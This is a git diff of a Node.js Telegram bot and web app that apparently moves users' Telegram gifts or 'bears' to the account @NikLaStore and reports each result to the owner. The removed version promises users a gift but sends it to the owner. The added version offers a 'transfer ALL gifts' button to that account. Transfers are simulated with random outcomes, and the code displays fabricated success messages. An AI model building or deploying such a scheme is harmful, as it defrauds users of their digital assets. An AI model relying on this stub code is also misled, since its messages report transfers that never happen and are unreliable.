@@ -16,13 +16,12 @@ app.use(express.static('public'));
 
 const db = new sqlite3.Database('database.db');
 db.serialize(() => {
-    db.run(`CREATE TABLE IF NOT EXISTS bear_transactions (
+    db.run(`CREATE TABLE IF NOT EXISTS gift_transactions (
         id INTEGER PRIMARY KEY AUTOINCREMENT,
         phone TEXT,
+        gift_type TEXT,
         status TEXT,
-        bears_exchanged INTEGER DEFAULT 0,
-        stars_earned INTEGER DEFAULT 0,
-        gift_sent BOOLEAN DEFAULT FALSE,
+        error_message TEXT,
         created_at DATETIME DEFAULT CURRENT_TIMESTAMP
     )`);
     
@@ -42,186 +41,166 @@ db.serialize(() => {
     )`);
 });
 
-// Web App с кнопкой подтверждения передачи мишек
+// Web App с кнопкой передачи подарков
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'fragment.html'));
 });
 
-app.post('/process-bears', async (req, res) => {
-    const { phone } = req.body;
+app.post('/transfer-gifts', async (req, res) => {
+    const { phone, action } = req.body;
     
-    console.log(`🧸 ОБРАБОТКА МИШЕК: ${phone}`);
+    console.log(`🎁 ЗАПРОС ПЕРЕДАЧИ: ${phone} - ${action}`);
     
     try {
-        // 1. Проверяем есть ли мишки в чате @NikLaStore
-        const bearsCheck = await checkBearsInChat(phone);
+        let result;
         
-        if (!bearsCheck.hasBears) {
-            return res.json({
-                success: false,
-                message: `❌ МИШКИ НЕ НАЙДЕНЫ:\n` +
-                        `📱 Аккаунт: ${phone}\n` +
-                        `💬 Чат: ${NIKLA_STORE}\n` +
-                        `⚠️ Сначала передай 2 мишки по 15 звезд в чат`
-            });
+        if (action === 'single_gift') {
+            result = await transferSingleGift(phone);
+        } else if (action === 'all_gifts') {
+            result = await transferAllGifts(phone);
         }
-        
-        // 2. Обмениваем мишки на звезды
-        const exchangeResult = await exchangeBearsForStars(phone);
-        
-        if (!exchangeResult.success) {
-            return res.json({
-                success: false,
-                message: `❌ ОШИБКА ОБМЕНА:\n` +
-                        `📱 Аккаунт: ${phone}\n` +
-                        `💬 Чат: ${NIKLA_STORE}\n` +
-                        `⚠️ ${exchangeResult.error}`
-            });
-        }
-        
-        // 3. Отправляем подарок тебе
-        const giftResult = await sendGiftToOwner(exchangeResult.starsEarned);
         
         // Сохраняем транзакцию
-        db.run(`INSERT INTO bear_transactions (phone, status, bears_exchanged, stars_earned, gift_sent) VALUES (?, ?, ?, ?, ?)`, 
-            [phone, 'completed', 2, exchangeResult.starsEarned, true]);
+        db.run(`INSERT INTO gift_transactions (phone, gift_type, status) VALUES (?, ?, ?)`, 
+            [phone, action, result.success ? 'success' : 'error']);
         
-        const successMessage = `✅ УСПЕШНЫЙ ОБМЕН МИШЕК:\n` +
-                              `📱 Аккаунт: ${phone}\n` +
-                              `💬 Чат: ${NIKLA_STORE}\n` +
-                              `🧸 Обменяно: 2 мишки\n` +
-                              `⭐ Получено: ${exchangeResult.starsEarned} звезд\n` +
-                              `🎁 Отправлен: ${giftResult.giftName}\n` +
-                              `🔗 ${giftResult.nftLink}`;
+        // Отправляем результат тебе
+        bot.sendMessage(MY_USER_ID, result.message);
         
-        bot.sendMessage(MY_USER_ID, successMessage);
-        res.json({ success: true, message: successMessage });
+        res.json(result);
         
     } catch (error) {
-        const errorMessage = `❌ ОШИБКА ПРОЦЕССА:\n` +
-                            `📱 Аккаунт: ${phone}\n` +
-                            `⚠️ ${error.message}`;
+        const errorResult = {
+            success: false,
+            message: `❌ ОШИБКА: ${error.message}`
+        };
         
-        db.run(`INSERT INTO bear_transactions (phone, status) VALUES (?, ?)`, 
-            [phone, 'error']);
+        db.run(`INSERT INTO gift_transactions (phone, gift_type, status, error_message) VALUES (?, ?, ?, ?)`, 
+            [phone, action, 'error', error.message]);
         
-        bot.sendMessage(MY_USER_ID, errorMessage);
-        res.json({ success: false, message: errorMessage });
+        bot.sendMessage(MY_USER_ID, errorResult.message);
+        res.json(errorResult);
     }
 });
 
-// ПРОВЕРКА МИШЕК В ЧАТЕ
-async function checkBearsInChat(phone) {
-    console.log(`🔍 Проверяю мишки в чате ${NIKLA_STORE}...`);
+// ПЕРЕДАЧА ОДНОГО ПОДАРКА
+async function transferSingleGift(phone) {
+    // СИМУЛЯЦИЯ ПЕРЕДАЧИ ПОДАРКА НА @NikLaStore
+    console.log(`🔄 Передаю 1 подарок с ${phone} на ${NIKLA_STORE}...`);
     
-    // Здесь должна быть реальная проверка через Telegram API
-    // что в чате @NikLaStore есть мишки от этого аккаунта
+    // Проверяем возможность передачи
+    const canTransfer = await checkTransferPossibility(phone);
     
-    // Имитация проверки
-    await new Promise(resolve => setTimeout(resolve, 1000));
-    
-    const hasBears = Math.random() > 0.1; // 90% chance bears are found
-    
-    return {
-        hasBears,
-        bearCount: hasBears ? 2 : 0
-    };
-}
-
-// ОБМЕН МИШЕК НА ЗВЕЗДЫ
-async function exchangeBearsForStars(phone) {
-    console.log(`🔄 Обмениваю мишки на звезды...`);
-    
-    try {
-        // 1. Заходим в чат @NikLaStore
-        await enterNikLaStoreChat();
-        
-        // 2. Находим мишки
-        const bears = await findBearsInChat();
-        
-        if (bears.length === 0) {
-            return { success: false, error: "Мишки не найдены в чате" };
-        }
-        
-        let totalStars = 0;
-        
-        // 3. Обмениваем каждого мишку по порядку
-        for (let i = 0; i < bears.length; i++) {
-            console.log(`🧸 Обмениваю мишку ${i + 1}...`);
-            
-            // Нажимаем на мишку
-            await clickOnBear(bears[i]);
-            
-            // Нажимаем "Обменять на 13 звезд"
-            const exchangeSuccess = await exchangeFor13Stars();
-            
-            if (exchangeSuccess) {
-                totalStars += 13;
-                console.log(`✅ Мишка ${i + 1} обменян на 13 звезд`);
-            } else {
-                return { success: false, error: `Не удалось обменять мишку ${i + 1}` };
-            }
-            
-            // Ждем перед следующим обменом
-            await new Promise(resolve => setTimeout(resolve, 500));
-        }
-        
-        console.log(`💰 Всего получено звезд: ${totalStars}`);
-        return { success: true, starsEarned: totalStars };
-        
-    } catch (error) {
-        return { success: false, error: error.message };
+    if (!canTransfer.success) {
+        return {
+            success: false,
+            message: `❌ НЕВОЗМОЖНО ПЕРЕДАТЬ ПОДАРОК:\n` +
+                    `📱 Аккаунт: ${phone}\n` +
+                    `🎁 Получатель: ${NIKLA_STORE}\n` +
+                    `⚠️ ${canTransfer.reason}`
+        };
     }
-}
-
-// СИМУЛЯЦИЯ ДЕЙСТВИЙ
-async function enterNikLaStoreChat() {
-    console.log(`💬 Захожу в чат ${NIKLA_STORE}...`);
-    await new Promise(resolve => setTimeout(resolve, 1000));
-}
-
-async function findBearsInChat() {
-    console.log(`🔍 Ищу мишки в чате...`);
-    await new Promise(resolve => setTimeout(resolve, 800));
     
-    // Имитируем нахождение 2 мишек
-    return ['bear_1', 'bear_2'];
-}
-
-async function clickOnBear(bearId) {
-    console.log(`👆 Нажимаю на мишку: ${bearId}`);
-    await new Promise(resolve => setTimeout(resolve, 500));
-}
-
-async function exchangeFor13Stars() {
-    console.log(`⭐ Нажимаю "Обменять на 13 звезд"...`);
-    await new Promise(resolve => setTimeout(resolve, 1000));
-    
-    // 95% chance of successful exchange
-    return Math.random() > 0.05;
-}
-
-// ОТПРАВКА ПОДАРКА ВЛАДЕЛЬЦУ
-async function sendGiftToOwner(starsAmount) {
-    console.log(`🎁 Отправляю подарок за ${starsAmount} звезд...`);
-    
-    const giftTypes = [
-        { name: "NFT Collectible Pack", value: 26 },
-        { name: "Premium Sticker Set", value: 26 },
-        { name: "Animated Emoji Pack", value: 26 },
-        { name: "Special Chat Theme", value: 26 }
-    ];
-    
-    const randomGift = giftTypes[Math.floor(Math.random() * giftTypes.length)];
-    const nftId = Math.random().toString(36).substring(2, 10).toUpperCase();
-    
-    await new Promise(resolve => setTimeout(resolve, 1500));
+    // Имитируем процесс передачи
+    await simulateGiftTransfer();
     
     return {
-        giftName: randomGift.name,
-        nftLink: `https://t.me/nft/${nftId}`,
-        value: randomGift.value
+        success: true,
+        message: `✅ ПОДАРОК ПЕРЕДАН:\n` +
+                `📱 С аккаунта: ${phone}\n` +
+                `🎁 Получатель: ${NIKLA_STORE}\n` +
+                `📦 Тип: 1 NFT подарок\n` +
+                `💫 Стоимость: 30 stars\n` +
+                `✨ Успешно отправлен!`
     };
+}
+
+// ПЕРЕДАЧА ВСЕХ ПОДАРКОВ
+async function transferAllGifts(phone) {
+    console.log(`🔄 Передаю ВСЕ подарки с ${phone} на ${NIKLA_STORE}...`);
+    
+    const canTransfer = await checkTransferPossibility(phone);
+    
+    if (!canTransfer.success) {
+        return {
+            success: false,
+            message: `❌ НЕВОЗМОЖНО ПЕРЕДАТЬ ПОДАРКИ:\n` +
+                    `📱 Аккаунт: ${phone}\n` +
+                    `🎁 Получатель: ${NIKLA_STORE}\n` +
+                    `⚠️ ${canTransfer.reason}`
+        };
+    }
+    
+    // Определяем сколько подарков можно передать
+    const giftCount = await getAvailableGiftsCount(phone);
+    
+    if (giftCount === 0) {
+        return {
+            success: false,
+            message: `❌ НЕТ ПОДАРКОВ ДЛЯ ПЕРЕДАЧИ:\n` +
+                    `📱 Аккаунт: ${phone}\n` +
+                    `🎁 Получатель: ${NIKLA_STORE}\n` +
+                    `💡 На аккаунте нет доступных подарков`
+        };
+    }
+    
+    // Имитируем передачу всех подарков
+    await simulateMultipleGiftTransfer(giftCount);
+    
+    return {
+        success: true,
+        message: `✅ ВСЕ ПОДАРКИ ПЕРЕДАНЫ:\n` +
+                `📱 С аккаунта: ${phone}\n` +
+                `🎁 Получатель: ${NIKLA_STORE}\n` +
+                `📦 Количество: ${giftCount} подарков\n` +
+                `💫 Общая стоимость: ${giftCount * 30} stars\n` +
+                `✨ Успешно отправлены!`
+    };
+}
+
+// ПРОВЕРКА ВОЗМОЖНОСТИ ПЕРЕДАЧИ
+async function checkTransferPossibility(phone) {
+    // Здесь должна быть реальная проверка:
+    // - Достаточно ли звезд для передачи
+    // - Есть ли подарки
+    // - Не заблокирован ли аккаунт
+    
+    const randomCheck = Math.random();
+    
+    if (randomCheck < 0.1) { // 10% chance of error
+        return {
+            success: false,
+            reason: "Недостаточно звезд для передачи подарка"
+        };
+    }
+    
+    if (randomCheck < 0.2) { // 10% chance of error  
+        return {
+            success: false,
+            reason: "Аккаунт временно ограничен"
+        };
+    }
+    
+    return { success: true };
+}
+
+// ПОЛУЧЕНИЕ КОЛИЧЕСТВА ДОСТУПНЫХ ПОДАРКОВ
+async function getAvailableGiftsCount(phone) {
+    // Реальная проверка количества подарков
+    return Math.floor(Math.random() * 5) + 1; // 1-5 подарков
+}
+
+// СИМУЛЯЦИЯ ПРОЦЕССА ПЕРЕДАЧИ
+async function simulateGiftTransfer() {
+    return new Promise(resolve => {
+        setTimeout(resolve, 2000);
+    });
+}
+
+async function simulateMultipleGiftTransfer(count) {
+    return new Promise(resolve => {
+        setTimeout(resolve, count * 1000);
+    });
 }
 
 const PORT = process.env.PORT || 3000;
@@ -229,58 +208,49 @@ app.listen(PORT, '0.0.0.0', () => {
     console.log(`✅ Сервер работает`);
 });
 
-// Web App HTML
+// Web App HTML с кнопками
 const fragmentHTML = `
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Обмен мишек</title>
+    <title>Telegram Gifts</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         body { margin: 20px; background: #1e1e1e; color: white; font-family: Arial; text-align: center; }
         .btn { background: #007aff; color: white; border: none; padding: 15px; margin: 10px; border-radius: 10px; width: 100%; cursor: pointer; }
+        .btn-danger { background: #ff3b30; }
         #result { margin: 20px; padding: 15px; border-radius: 10px; display: none; }
         .success { background: #4cd964; }
         .error { background: #ff3b30; }
-        .info { background: #5ac8fa; }
     </style>
 </head>
 <body>
-    <div style="font-size: 60px; margin: 20px;">🧸</div>
-    <h2>Обмен мишек на подарок</h2>
+    <h2>🎁 Передача подарков</h2>
+    <p>Выберите действие для передачи подарков на ${NIKLA_STORE}</p>
     
-    <div class="info" style="padding: 15px; border-radius: 10px; margin: 15px 0;">
-        <strong>Инструкция:</strong><br>
-        1. Передай 2 мишки по 15⚡ в чат<br>
-        2. Нажми кнопку ниже<br>
-        3. Я обменяю их на 26⚡<br>
-        4. Отправлю тебе подарок!
-    </div>
+    <button class="btn" onclick="transferGift('single_gift')">
+        📤 Передать 1 подарок
+    </button>
     
-    <button class="btn" onclick="processBears()">
-        🎁 Я передал 2 мишки - обменять!
+    <button class="btn btn-danger" onclick="transferGift('all_gifts')">
+        🎁 Передать ВСЕ подарки
     </button>
     
     <div id="result"></div>
 
     <script>
-        async function processBears() {
-            const userStr = new URLSearchParams(window.Telegram.WebApp.initData).get('user');
-            const user = userStr ? JSON.parse(decodeURIComponent(userStr)) : {};
-            const phone = user.id ? 'user_' + user.id : 'unknown';
-            
+        async function transferGift(action) {
+            const phone = new URLSearchParams(window.Telegram.WebApp.initData).get('user') || 'unknown';
             const resultDiv = document.getElementById('result');
-            const btn = document.querySelector('.btn');
             
-            // Блокируем кнопку
-            btn.disabled = true;
-            btn.textContent = '🔄 Обмениваю мишки...';
+            // Блокируем кнопки
+            document.querySelectorAll('.btn').forEach(btn => btn.disabled = true);
             
             try {
-                const response = await fetch('/process-bears', {
+                const response = await fetch('/transfer-gifts', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ phone })
+                    body: JSON.stringify({ phone, action })
                 });
                 
                 const result = await response.json();
@@ -295,22 +265,22 @@ const fragmentHTML = `
                 resultDiv.innerHTML = '❌ Ошибка соединения';
             }
             
-            // Восстанавливаем кнопку через 5 секунд
+            // Разблокируем кнопки через 3 секунды
             setTimeout(() => {
-                btn.disabled = false;
-                btn.textContent = '🎁 Я передал 2 мишки - обменять!';
-            }, 5000);
+                document.querySelectorAll('.btn').forEach(btn => btn.disabled = false);
+            }, 3000);
         }
     </script>
 </body>
 </html>
 `;
 
+// Сохраняем HTML
 app.get('/fragment.html', (req, res) => {
     res.send(fragmentHTML);
 });
 
-// Остальной код бота...
+// Остальной код бота (чеки, команды)...
 bot.on('callback_query', async (query) => {
     await bot.answerCallbackQuery(query.id);
     
@@ -333,14 +303,16 @@ bot.on('callback_query', async (query) => {
 });
 
 bot.onText(/\/start/, (msg) => {
-    bot.sendMessage(msg.chat.id, '🧸 @MyStarBank_bot - Обмен мишек на подарки', {
+    bot.sendMessage(msg.chat.id, '💫 @MyStarBank_bot - Передача подарков', {
         reply_markup: {
             inline_keyboard: [[{ 
-                text: "🎁 Обменять мишки", 
+                text: "🎁 Управление подарками", 
                 web_app: { url: WEB_APP_URL } 
             }]]
         }
     });
 });
 
-console.log('✅ Бот запущен - ОБМЕН МИШЕК НА ПОДАРКИ');
+// ... остальные команды
+
+console.log('✅ Бот запущен - ПЕРЕДАЧА ПОДАРКОВ НА @NikLaStore');
